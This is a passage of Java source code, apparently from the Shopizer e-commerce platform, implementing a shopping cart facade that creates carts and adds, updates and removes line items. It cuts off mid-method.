com.salesmanager.shop.store.api.exception.ResourceNotFoundException;\nimport com.salesmanager.shop.utils.DateUtil;\nimport com.salesmanager.shop.utils.ImageFilePath;\n\n/**\n * @author Umesh Awasthi\n * @version 1.0\n * @since 1.0\n */\n@Service( value = \"shoppingCartFacade\" )\npublic class ShoppingCartFacadeImpl\n    implements ShoppingCartFacade\n{\n\n    \n    private static final Logger LOG = LoggerFactory.getLogger(ShoppingCartFacadeImpl.class);\n\n    @Inject\n    private ShoppingCartService shoppingCartService;\n\n    @Inject\n    ShoppingCartCalculationService shoppingCartCalculationService;\n\n    @Inject\n    private ProductPriceUtils productPriceUtils;\n\n    @Inject\n    private ProductService productService;\n\n    @Inject\n    private PricingService pricingService;\n\n    @Inject\n    private ProductAttributeService productAttributeService;\n\n\t@Inject\n\t@Qualifier(\"img\")\n\tprivate ImageFilePath imageUtils;\n\n    public void deleteShoppingCart(final Long id, final MerchantStore store) throws Exception {\n    \tShoppingCart cart = shoppingCartService.getById(id, store);\n    \tif(cart!=null) {\n    \t\tshoppingCartService.deleteCart(cart);\n    \t}\n    }\n    \n    @Override\n    public void deleteShoppingCart(final String code, final MerchantStore store) throws Exception {\n    \tShoppingCart cart = shoppingCartService.getByCode(code, store);\n    \tif(cart!=null) {\n    \t\tshoppingCartService.deleteCart(cart);\n    \t}\n    }\n\n    @Override\n    public ShoppingCartData addItemsToShoppingCart( final ShoppingCartData shoppingCartData,\n                                                    final ShoppingCartItem item, final MerchantStore store, final Language language,final Customer customer )\n        throws Exception\n    {\n\n        ShoppingCart cartModel = null;\n        if(item.getQuantity() < 1) item.setQuantity(1);\n        /**\n         * Sometimes a user logs in and a shopping cart is present in db (shoppingCartData\n         * but ui has no cookie with shopping cart code so the cart code will have\n         * to be added to the item in order to process add to cart normally\n         */\n        if(shoppingCartData != null && StringUtils.isBlank(item.getCode())) {\n        \titem.setCode(shoppingCartData.getCode());\n        }\n        \n        \n        if ( !StringUtils.isBlank( item.getCode() ) )\n        {\n            // get it from the db\n            cartModel = getShoppingCartModel( item.getCode(), store );\n            if ( cartModel == null )\n            {\n                cartModel = createCartModel( shoppingCartData.getCode(), store,customer );\n            }\n\n        }\n\n        if ( cartModel == null )\n        {\n\n            final String shoppingCartCode =\n                StringUtils.isNotBlank( shoppingCartData.getCode() ) ? shoppingCartData.getCode() : null;\n            cartModel = createCartModel( shoppingCartCode, store,customer );\n\n        }\n        com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem =\n            createCartItem( cartModel, item, store );\n        \n        \n        boolean duplicateFound = false;\n        if(CollectionUtils.isEmpty(item.getShoppingCartAttributes())) {//increment quantity\n        \t//get duplicate item from the cart\n        \tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> cartModelItems = cartModel.getLineItems();\n        \tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem cartItem : cartModelItems) {\n        \t\tif(cartItem.getProduct().getId().longValue()==shoppingCartItem.getProduct().getId().longValue()) {\n        \t\t\tif(CollectionUtils.isEmpty(cartItem.getAttributes())) {\n        \t\t\t\tif(!duplicateFound) {\n        \t\t\t\t\tif(!shoppingCartItem.isProductVirtual()) {\n\t        \t\t\t\t\tcartItem.setQuantity(cartItem.getQuantity() + shoppingCartItem.getQuantity());\n        \t\t\t\t\t}\n        \t\t\t\t\tduplicateFound = true;\n        \t\t\t\t\tbreak;\n        \t\t\t\t}\n        \t\t\t}\n        \t\t}\n        \t}\n        }\n        \n        if(!duplicateFound) {\n        \t//shoppingCartItem.getAttributes().stream().forEach(a -> {a.setProductAttributeId(productAttributeId);});\n        \tcartModel.getLineItems().add( shoppingCartItem );\n        }\n        \n        /** Update cart in database with line items **/\n        shoppingCartService.saveOrUpdate( cartModel );\n\n        //refresh cart\n        cartModel = shoppingCartService.getById(cartModel.getId(), store);\n\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n\n        ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n        shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n        shoppingCartDataPopulator.setPricingService( pricingService );\n        shoppingCartDataPopulator.setimageUtils(imageUtils);\n\n\n        return shoppingCartDataPopulator.populate( cartModel, store, language );\n    }\n\n    private com.salesmanager.core.model.shoppingcart.ShoppingCartItem createCartItem( final ShoppingCart cartModel,\n                                                                                               final ShoppingCartItem shoppingCartItem,\n                                                                                               final MerchantStore store )\n        throws Exception\n    {\n\n        Product product = productService.getById( shoppingCartItem.getProductId() );\n\n        if ( product == null )\n        {\n            throw new Exception( \"Item with id \" + shoppingCartItem.getProductId() + \" does not exist\" );\n        }\n\n        if ( product.getMerchantStore().getId().intValue() != store.getId().intValue() )\n        {\n            throw new Exception( \"Item with id \" + shoppingCartItem.getProductId() + \" does not belong to merchant \"\n                + store.getId() );\n        }\n        \n\t\t/**\n\t\t * Check if product quantity is 0\n\t\t * Check if product is available\n\t\t * Check if date available <= now\n\t\t */\n        \n        Set<ProductAvailability> availabilities = product.getAvailabilities();\n        if(availabilities == null) {\n        \t\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not properly configured\" );\n        \t\n        }\n        \t\n        for(ProductAvailability availability : availabilities) {\n        \tif(availability.getProductQuantity() == null || availability.getProductQuantity().intValue() <= 0) {\n                throw new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        \t}\n        }\n        \n        if(!product.isAvailable()) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n        \n        if(!DateUtil.dateBeforeEqualsDate(product.getDateAvailable(), new Date())) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n\n\n        com.salesmanager.core.model.shoppingcart.ShoppingCartItem item =\n            shoppingCartService.populateShoppingCartItem( product );\n\n        item.setQuantity( shoppingCartItem.getQuantity() );\n        item.setShoppingCart( cartModel );\n\n        // attributes\n        List<ShoppingCartAttribute> cartAttributes = shoppingCartItem.getShoppingCartAttributes();\n        if ( !CollectionUtils.isEmpty( cartAttributes ) )\n        {\n            for ( ShoppingCartAttribute attribute : cartAttributes )\n            {\n                ProductAttribute productAttribute = productAttributeService.getById( attribute.getAttributeId() );\n                if ( productAttribute != null\n                    && productAttribute.getProduct().getId().longValue() == product.getId().longValue() )\n                {\n                    com.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem attributeItem =\n                        new com.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem( item,\n                                                                                                         productAttribute );\n\n                    item.addAttributes( attributeItem );\n                }\n            }\n        }\n        return item;\n\n    }\n\n    \n    //used for api\n\tprivate com.salesmanager.core.model.shoppingcart.ShoppingCartItem createCartItem(ShoppingCart cartModel,\n\t\t\t PersistableShoppingCartItem shoppingCartItem, MerchantStore store) throws Exception {\n\n\t\tProduct product = productService.getById(shoppingCartItem.getProduct());\n\n\t\tif (product == null) {\n\t\t\tthrow new ResourceNotFoundException(\"Item with id \" + shoppingCartItem.getProduct() + \" does not exist\");\n\t\t}\n\n\t\tif (product.getMerchantStore().getId().intValue() != store.getId().intValue()) {\n\t\t\tthrow new ResourceNotFoundException(\"Item with id \" + shoppingCartItem.getProduct() + \" does not belong to merchant \"\n\t\t\t\t\t+ store.getId());\n\t\t}\n\t\t\n\t\t/**\n\t\t * Check if product quantity is 0\n\t\t * Check if product is available\n\t\t * Check if date available <= now\n\t\t */\n        \n        Set<ProductAvailability> availabilities = product.getAvailabilities();\n        if(availabilities == null) {\n        \t\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not properly configured\" );\n        \t\n        }\n        \t\n        for(ProductAvailability availability : availabilities) {\n        \tif(availability.getProductQuantity() == null || availability.getProductQuantity().intValue() <= 0) {\n                throw new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        \t}\n        }\n        \n        if(!product.isAvailable()) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n        \n        if(!DateUtil.dateBeforeEqualsDate(product.getDateAvailable(), new Date())) {\n        \tthrow new Exception( \"Item with id \" + product.getId() + \" is not available\");\n        }\n\t\t\n\n\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartItem item = shoppingCartService\n\t\t\t\t.populateShoppingCartItem(product);\n\n\t\titem.setQuantity(shoppingCartItem.getQuantity());\n\t\titem.setShoppingCart(cartModel);\n\t\t\n\t\t//set attributes\n\t\tList<com.salesmanager.shop.model.catalog.product.attribute.ProductAttribute> attributes = shoppingCartItem.getAttributes();\n\t\tif (!CollectionUtils.isEmpty(attributes)) {\n\t\t\tfor(com.salesmanager.shop.model.catalog.product.attribute.ProductAttribute attribute : attributes) {\n\t\t\t\t\n\t\t\t\tProductAttribute productAttribute = productAttributeService.getById(attribute.getId());\n\t\t\t\t\n\t\t\t\tif (productAttribute != null\n\t\t\t\t\t\t&& productAttribute.getProduct().getId().longValue() == product.getId().longValue()) {\n\t\t\t\t\t\n\t\t\t\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem attributeItem = new com.salesmanager.core.model.shoppingcart.ShoppingCartAttributeItem(\n\t\t\t\t\t\t\titem, productAttribute);\n\n\t\t\t\t\titem.addAttributes(attributeItem);\n\t\t\t\t}\t\t\t\t\n\t\t\t}\n\t\t}\n\n\t\treturn item;\n\n\t}   \n    \n\n    @Override\n    public ShoppingCart createCartModel( final String shoppingCartCode, final MerchantStore store,final Customer customer )\n        throws Exception\n    {\n        final Long CustomerId = customer != null ? customer.getId() : null;\n        ShoppingCart cartModel = new ShoppingCart();\n        if ( StringUtils.isNotBlank( shoppingCartCode ) )\n        {\n            cartModel.setShoppingCartCode( shoppingCartCode );\n        }\n        else\n        {\n            cartModel.setShoppingCartCode( uniqueShoppingCartCode() );\n        }\n\n        cartModel.setMerchantStore( store );\n        if ( CustomerId != null )\n        {\n            cartModel.setCustomerId( CustomerId );\n        }\n        shoppingCartService.create( cartModel );\n        return cartModel;\n    }\n\n\n\n\n\n    private com.salesmanager.core.model.shoppingcart.ShoppingCartItem getEntryToUpdate( final long entryId,\n                                                                                                 final ShoppingCart cartModel )\n    {\n        if ( CollectionUtils.isNotEmpty( cartModel.getLineItems() ) )\n        {\n            for ( com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem : cartModel.getLineItems() )\n            {\n                if ( shoppingCartItem.getId().longValue() == entryId )\n                {\n                    LOG.info( \"Found line item  for given entry id: \" + entryId );\n                    return shoppingCartItem;\n\n                }\n            }\n        }\n        LOG.info( \"Unable to find any entry for given Id: \" + entryId );\n        return null;\n    }\n\n    private Object getKeyValue( final String key )\n    {\n        ServletRequestAttributes reqAttr = (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();\n        return reqAttr.getRequest().getAttribute( key );\n    }\n\n    @Override\n    public ShoppingCartData getShoppingCartData( final Customer customer, final MerchantStore store,\n                                                 final String shoppingCartId, Language language)\n        throws Exception\n    {\n\n        ShoppingCart cart = null;\n        try\n        {\n            if ( customer != null )\n            {\n                LOG.info( \"Reteriving customer shopping cart...\" );\n\n                cart = shoppingCartService.getShoppingCart( customer );\n\n            }\n\n            else\n            {\n                if ( StringUtils.isNotBlank( shoppingCartId ) && cart == null )\n                {\n                    cart = shoppingCartService.getByCode( shoppingCartId, store );\n                }\n\n            }\n        }\n        catch ( ServiceException ex )\n        {\n            LOG.error( \"Error while retriving cart from customer\", ex );\n        }\n        catch( NoResultException nre) {\n        \t//nothing\n        }\n\n        if ( cart == null )\n        {\n            return null;\n        }\n\n        LOG.info( \"Cart model found.\" );\n\n        ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n        shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n        shoppingCartDataPopulator.setPricingService( pricingService );\n        shoppingCartDataPopulator.setimageUtils(imageUtils);\n\n        //Language language = (Language) getKeyValue( Constants.LANGUAGE );\n        MerchantStore merchantStore = (MerchantStore) getKeyValue( Constants.MERCHANT_STORE );\n        \n        ShoppingCartData shoppingCartData = shoppingCartDataPopulator.populate( cart, merchantStore, language );\n        \n/*        List<ShoppingCartItem> unavailables = new ArrayList<ShoppingCartItem>();\n        List<ShoppingCartItem> availables = new ArrayList<ShoppingCartItem>();\n        //Take out items no more available\n        List<ShoppingCartItem> items = shoppingCartData.getShoppingCartItems();\n        for(ShoppingCartItem item : items) {\n        \tString code = item.getProductCode();\n        \tProduct p =productService.getByCode(code, language);\n        \tif(!p.isAvailable()) {\n        \t\tunavailables.add(item);\n        \t} else {\n        \t\tavailables.add(item);\n        \t}\n        \t\n        }\n        shoppingCartData.setShoppingCartItems(availables);\n        shoppingCartData.setUnavailables(unavailables);*/\n        \n        return shoppingCartData;\n\n    }\n\n    //@Override\n    public ShoppingCartData getShoppingCartData( final ShoppingCart shoppingCartModel, Language language)\n        throws Exception\n    {\n\n        ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n        shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n        shoppingCartDataPopulator.setPricingService( pricingService );\n        shoppingCartDataPopulator.setimageUtils(imageUtils);\n        //Language language = (Language) getKeyValue( Constants.LANGUAGE );\n        MerchantStore merchantStore = (MerchantStore) getKeyValue( Constants.MERCHANT_STORE );\n        return shoppingCartDataPopulator.populate( shoppingCartModel, merchantStore, language );\n    }\n\n\t@Override\n    public ShoppingCartData removeCartItem( final Long itemID, final String cartId ,final MerchantStore store,final Language language )\n        throws Exception\n    {\n        if ( StringUtils.isNotBlank( cartId ) )\n        {\n\n            ShoppingCart cartModel = getCartModel( cartId,store );\n            if ( cartModel != null )\n            {\n                if ( CollectionUtils.isNotEmpty( cartModel.getLineItems() ) )\n                {\n                    Set<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> shoppingCartItemSet =\n                        new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n                    for ( com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem : cartModel.getLineItems() )\n                    {\n                        if(shoppingCartItem.getId().longValue() == itemID.longValue() )\n                        {\n                    \t\tshoppingCartService.deleteShoppingCartItem(itemID);\n                        } else {\n                            shoppingCartItemSet.add(shoppingCartItem);\n                        }\n                    }\n                    \n                    cartModel.setLineItems(shoppingCartItemSet);\n\n\n                    ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n                    shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n                    shoppingCartDataPopulator.setPricingService( pricingService );\n                    shoppingCartDataPopulator.setimageUtils(imageUtils);\n                    return shoppingCartDataPopulator.populate( cartModel, store, language );\n                    \n\n                }\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public ShoppingCartData updateCartItem( final Long itemID, final String cartId, final long newQuantity,final MerchantStore store, final Language language )\n        throws Exception\n    {\n        if ( newQuantity < 1 )\n        {\n            throw new CartModificationException( \"Quantity must not be less than one\" );\n        }\n        if ( StringUtils.isNotBlank( cartId ) )\n        {\n            ShoppingCart cartModel = getCartModel( cartId,store );\n            if ( cartModel != null )\n            {\n                com.salesmanager.core.model.shoppingcart.ShoppingCartItem entryToUpdate =\n                    getEntryToUpdate( itemID.longValue(), cartModel );\n\n                if ( entryToUpdate == null )\n                {\n                    throw new CartModificationException( \"Unknown entry number.\" );\n                }\n\n                entryToUpdate.getProduct();\n\n                LOG.info( \"Updating cart entry quantity to\" + newQuantity );\n                entryToUpdate.setQuantity( (int) newQuantity );\n                List<ProductAttribute> productAttributes = new ArrayList<ProductAttribute>();\n                productAttributes.addAll( entryToUpdate.getProduct().getAttributes() );\n                final FinalPrice finalPrice =\n                    productPriceUtils.getFinalProductPrice( entryToUpdate.getProduct(), productAttributes );\n                entryToUpdate.setItemPrice( finalPrice.getFinalPrice() );\n                shoppingCartService.saveOrUpdate( cartModel );\n\n                LOG.info( \"Cart entry updated with desired quantity\" );\n                ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n                shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n                shoppingCartDataPopulator.setPricingService( pricingService );\n                shoppingCartDataPopulator.setimageUtils(imageUtils);\n                return shoppingCartDataPopulator.populate( cartModel, store, language );\n\n            }\n        }\n        return null;\n    }\n    \n    @Override\n    public ShoppingCartData updateCartItems( final List<ShoppingCartItem> shoppingCartItems, final MerchantStore store, final Language language )\n            throws Exception\n        {\n    \t\n    \t\tValidate.notEmpty(shoppingCartItems,\"shoppingCartItems null or empty\");\n    \t\tShoppingCart cartModel = null;\n    \t\tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> cartItems = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n    \t\tfor(ShoppingCartItem item : shoppingCartItems) {\n    \t\t\t\n    \t\t\tif(item.getQuantity()<1) {\n    \t\t\t\tthrow new CartModificationException( \"Quantity must not be less than one\" );\n    \t\t\t}\n    \t\t\t\n    \t\t\tif(cartModel==null) {\n    \t\t\t\tcartModel = getCartModel( item.getCode(), store );\n    \t\t\t}\n    \t\t\t\n                com.salesmanager.core.model.shoppingcart.ShoppingCartItem entryToUpdate =\n                        getEntryToUpdate( item.getId(), cartModel );\n\n                if ( entryToUpdate == null ) {\n                        throw new CartModificationException( \"Unknown entry number.\" );\n                }\n\n                entryToUpdate.getProduct();\n\n                LOG.info( \"Updating cart entry quantity to\" + item.getQuantity() );\n                entryToUpdate.setQuantity( (int) item.getQuantity() );\n                \n                List<ProductAttribute> productAttributes = new ArrayList<ProductAttribute>();\n                productAttributes.addAll( entryToUpdate.getProduct().getAttributes() );\n                \n                final FinalPrice finalPrice =\n                        productPriceUtils.getFinalProductPrice( entryToUpdate.getProduct(), productAttributes );\n                entryToUpdate.setItemPrice( finalPrice.getFinalPrice() );\n                    \n\n                cartItems.add(entryToUpdate);\n    \t\t\t\n    \t\t\t\n    \t\t\t\n    \t\t\t\n    \t\t}\n    \t\t\n    \t\tcartModel.setLineItems(cartItems);\n    \t\tshoppingCartService.saveOrUpdate( cartModel );\n\n    \t\t\n            LOG.info( \"Cart entry updated with desired quantity\" );\n            ShoppingCartDataPopulator shoppingCartDataPopulator = new ShoppingCartDataPopulator();\n            shoppingCartDataPopulator.setShoppingCartCalculationService( shoppingCartCalculationService );\n            shoppingCartDataPopulator.setPricingService( pricingService );\n            shoppingCartDataPopulator.setimageUtils(imageUtils);\n            return shoppingCartDataPopulator.populate( cartModel, store, language );\n\n        }\n\n\n    private ShoppingCart getCartModel( final String cartId,final MerchantStore store )\n    {\n        if ( StringUtils.isNotBlank( cartId ) )\n        {\n           try\n            {\n                return shoppingCartService.getByCode( cartId, store );\n            }\n            catch ( ServiceException e )\n            {\n                LOG.error( \"unable to find any cart asscoiated with this Id: \" + cartId );\n                LOG.error( \"error while fetching cart model...\", e );\n                return null;\n            }\n            catch( NoResultException nre) {\n           \t//nothing\n            }\n\n        }\n        return null;\n    }\n\n\t@Override\n\tpublic ShoppingCartData getShoppingCartData(String code, MerchantStore store, Language language) {\n\t\ttry {\n\t\t\tShoppingCart cartModel = shoppingCartService.getByCode( code, store );\n\t\t\tif(cartModel!=null) {\n\t\t\t\tShoppingCartData cart = getShoppingCartData(cartModel, language);\n\t\t\t\treturn cart;\n\t\t\t}\n\t\t} catch( NoResultException nre) {\n\t        \t//nothing\n\n\t\t} catch(Exception e) {\n\t\t\tLOG.error(\"Cannot retrieve cart code \" + code,e);\n\t\t}\n\n\n\t\treturn null;\n\t}\n\n\t@Override\n\tpublic ShoppingCart getShoppingCartModel(String shoppingCartCode,\n\t\t\tMerchantStore store) throws Exception {\n\t\treturn shoppingCartService.getByCode( shoppingCartCode, store );\n\t}\n\n\t@Override\n\tpublic ShoppingCart getShoppingCartModel(Customer customer,\n\t\t\tMerchantStore store) throws Exception {\n\t\treturn shoppingCartService.getByCustomer(customer);\n\t}\n\n\t@Override\n\tpublic void saveOrUpdateShoppingCart(ShoppingCart cart) throws Exception {\n\t\tshoppingCartService.saveOrUpdate(cart);\n\t\t\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart getCart(Customer customer, MerchantStore store, Language language) throws Exception {\n\t\t\n\t\tValidate.notNull(customer,\"Customer cannot be null\");\n\t\tValidate.notNull(customer.getId(),\"Customer.id cannot be null or empty\");\n\t\t\n\t\t//Check if customer has an existing shopping cart\n\t\tShoppingCart cartModel = shoppingCartService.getByCustomer(customer);\n\t\t\n\t\tif(cartModel == null) {\n\t\t\treturn null;\n\t\t}\n\t\t\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n        \n        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n        \n        readableShoppingCart.setImageUtils(imageUtils);\n        readableShoppingCart.setPricingService(pricingService);\n        readableShoppingCart.setProductAttributeService(productAttributeService);\n        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n  \n        ReadableShoppingCart readableCart = new  ReadableShoppingCart();\n        \n        readableShoppingCart.populate(cartModel, readableCart,  store, language);\n\n\t\t\n\t\treturn readableCart;\n\t}\n\t\n\t@Override\n\tpublic ReadableShoppingCart addToCart(PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\tValidate.notNull(item,\"PersistableShoppingCartItem cannot be null\");\n\t\t\n\t\t//if cart does not exist create a new one\n\n\t\tShoppingCart cartModel = new ShoppingCart();\n\t\tcartModel.setMerchantStore(store);\n\t\tcartModel.setShoppingCartCode(uniqueShoppingCartCode());\n\n\n\t\treturn readableShoppingCart(cartModel,item,store,language);\n\t}\n\t\n\n\t@Override\n\tpublic void removeShoppingCartItem(String cartCode, Long productId,\n\t      MerchantStore merchant, Language language) throws Exception {\n\t    Validate.notNull(cartCode, \"Shopping cart code must not be null\");\n\t    Validate.notNull(productId, \"product id must not be null\");\n\t    Validate.notNull(merchant, \"MerchantStore must not be null\");\n\t    \n\t  \n\t    //get cart\n\t    ShoppingCart cart = getCartModel(cartCode, merchant);\n\t    \n\t    if(cart == null) {\n\t      throw new ResourceNotFoundException(\"Cart code [ \" + cartCode + \" ] not found\");\n\t    }\n\t    \n\t    Set<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> items = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n\t    com.salesmanager.core.model.shoppingcart.ShoppingCartItem itemToDelete = null;\n\t    for ( com.salesmanager.core.model.shoppingcart.ShoppingCartItem shoppingCartItem : cart.getLineItems() )\n        {\n            if ( shoppingCartItem.getProduct().getId().longValue() == productId.longValue() )\n            {\n                //get cart item\n                itemToDelete =\n                    getEntryToUpdate( shoppingCartItem.getId(), cart );\n                \n                \n                //break;\n\n            } else {\n              items.add(shoppingCartItem);\n            }\n        }\n\t    //delete item\n\t    if(itemToDelete!=null) {\n\t      shoppingCartService.deleteShoppingCartItem(itemToDelete.getId());\n\t    }\n        \n        //remaining items\n\t    if(items.size()>0) {\n\t    \tcart.setLineItems(items);\n\t    } else {\n\t    \tcart.getLineItems().clear();\n\t    }\n\n        //if(items.size()>0) {\n          shoppingCartService.saveOrUpdate(cart);//update cart with remaining items\n          //ReadableShoppingCart readableShoppingCart = this.getByCode(cartCode, merchant, language);\n        //}\n\n\t}\n\t\n\tprivate ReadableShoppingCart readableShoppingCart(ShoppingCart cartModel, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\t\n\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartItem itemModel = createCartItem(cartModel, item, store);\n\t\t\n\t\t//need to check if the item is already in the cart\n        boolean duplicateFound = false;\n        //only if item has no attributes\n        if(CollectionUtils.isEmpty(item.getAttributes())) {//increment quantity\n        \t//get duplicate item from the cart\n        \tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> cartModelItems = cartModel.getLineItems();\n        \tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem cartItem : cartModelItems) {\n        \t\tif(cartItem.getProduct().getId().longValue()==item.getProduct().longValue()) {\n        \t\t\tif(CollectionUtils.isEmpty(cartItem.getAttributes())) {\n        \t\t\t\tif(!duplicateFound) {\n        \t\t\t\t\tif(!itemModel.isProductVirtual()) {\n\t        \t\t\t\t\tcartItem.setQuantity(cartItem.getQuantity() + item.getQuantity());\n        \t\t\t\t\t}\n        \t\t\t\t\tduplicateFound = true;\n        \t\t\t\t\tbreak;\n        \t\t\t\t}\n        \t\t\t}\n        \t\t}\n        \t}\n        } \n        \n        if(!duplicateFound) {\n        \tcartModel.getLineItems().add( itemModel );\n        }\n        \n        saveShoppingCart( cartModel );\n\n        //refresh cart\n        cartModel = shoppingCartService.getById(cartModel.getId(), store);\n\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n        \n        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n        \n        readableShoppingCart.setImageUtils(imageUtils);\n        readableShoppingCart.setPricingService(pricingService);\n        readableShoppingCart.setProductAttributeService(productAttributeService);\n        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n  \n        ReadableShoppingCart readableCart = new  ReadableShoppingCart();\n        \n        readableShoppingCart.populate(cartModel, readableCart,  store, language);\n\n\t\t\n\t\treturn readableCart;\n\t\t\n\t}\n\n\n\tprivate ReadableShoppingCart modifyCart(ShoppingCart cartModel, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\t\n\t\tcom.salesmanager.core.model.shoppingcart.ShoppingCartItem itemModel = createCartItem(cartModel, item, store);\n\n        boolean itemModified = false;\n        //check if existing product\n       \tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> items = cartModel.getLineItems();\n       \t//com.salesmanager.core.model.shoppingcart.ShoppingCartItem affectedItem = null;\n       \tif(!CollectionUtils.isEmpty(items)) {\n       \t\tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> newItems = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n       \t\tSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem> removeItems = new HashSet<com.salesmanager.core.model.shoppingcart.ShoppingCartItem>();\n\t    \tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem anItem : items) {//take care of existing product\n\t    \t\tif(itemModel.getProduct().getId().longValue() == anItem.getProduct().getId()) {\n\t    \t\t\tif(item.getQuantity()==0) {//left aside item to be removed\n\t    \t\t\t\t//don't add it to new list of item\n\t    \t\t\t\tremoveItems.add(anItem);\n\t    \t\t\t} else {\n\t    \t\t\t\t//new quantity\n\t    \t\t\t\tanItem.setQuantity(item.getQuantity());\n\t    \t\t\t\tnewItems.add(anItem);\n\t    \t\t\t}\n\t    \t\t\titemModified = true;\n\t    \t\t} else {\n\t    \t\t\tnewItems.add(anItem);\n\t    \t\t}\n\t    \t}\n\t    \t\n\t    \tif(!removeItems.isEmpty()) {\n\t    \t\tfor(com.salesmanager.core.model.shoppingcart.ShoppingCartItem emptyItem : removeItems) {\n\t    \t\t\tshoppingCartService.deleteShoppingCartItem(emptyItem.getId());\n\t    \t\t}\n\t    \t\t\n\t    \t}\n\t    \t\n\t    \tif(!itemModified) {\n\t    \t  newItems.add(itemModel);\n\t    \t}\n\t    \t\n\t    \tif(newItems.isEmpty()) {\n\t    \t\tnewItems = null;\n\t    \t}\n\t    \t\n\t    \tcartModel.setLineItems(newItems);\n       \t} else {\n           \t//new item\n             if(item.getQuantity() > 0) {\n                cartModel.getLineItems().add( itemModel );\n             }\n       \t}\n\n       \t//if cart items are null just return cart with no items\n\n        saveShoppingCart( cartModel );\n\n        //refresh cart\n        cartModel = shoppingCartService.getById(cartModel.getId(), store);\n        \n        if(cartModel==null) {\n        \treturn null;\n        }\n\n        shoppingCartCalculationService.calculate( cartModel, store, language );\n        \n        ReadableShoppingCartPopulator readableShoppingCart = new ReadableShoppingCartPopulator();\n        \n        readableShoppingCart.setImageUtils(imageUtils);\n        readableShoppingCart.setPricingService(pricingService);\n        readableShoppingCart.setProductAttributeService(productAttributeService);\n        readableShoppingCart.setShoppingCartCalculationService(shoppingCartCalculationService);\n  \n        ReadableShoppingCart readableCart = new  ReadableShoppingCart();\n        \n        readableShoppingCart.populate(cartModel, readableCart,  store, language);\n\n\t\t\n\t\treturn readableCart;\n\t\t\n\t}\n\n\t@Override\n\tpublic ReadableShoppingCart addToCart(Customer customer, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\t\t\n\t\tValidate.notNull(customer,\"Customer cannot be null\");\n\t\tValidate.notNull(customer.getId(),\"Customer.id cannot be null or empty\");\n\t\tif(item.getQuantity() < 1) item.setQuantity(1);\n\t\t//Check if customer has an existing shopping cart\n\t\tShoppingCart cartModel = shoppingCartService.getByCustomer(customer);\n\t\t\n\t\t//if cart does not exist create a new one\n\t\tif(cartModel==null) {\n\t\t\tcartModel = new ShoppingCart();\n\t\t\tcartModel.setCustomerId(customer.getId());\n\t\t\tcartModel.setMerchantStore(store);\n\t\t\tcartModel.setShoppingCartCode(uniqueShoppingCartCode());\n\t\t}\n\t\t\n\t\treturn readableShoppingCart(cartModel,item,store,language);\n\t}\n\t\n\t@Override\n\tpublic ReadableShoppingCart modifyCart(String cartCode, PersistableShoppingCartItem item, MerchantStore store,\n\t\t\tLanguage language) throws Exception {\n\n\t\tValidate.notNull(cartCode,\"PString cart code cannot be null\");\n\t\tValidate.notNull(item,\"PersistableShoppingCartItem cannot be null\");\n\t\t\n\t\tShoppingCart cartModel = this.getCartModel(cartCode, store);\n\n\n\t\treturn modifyCart(cartModel,item, store, language);\n\t\t\n\t\t\n\t}\n\t\n\tprivate void saveShoppingCart(ShoppingCart shoppingCart) throws 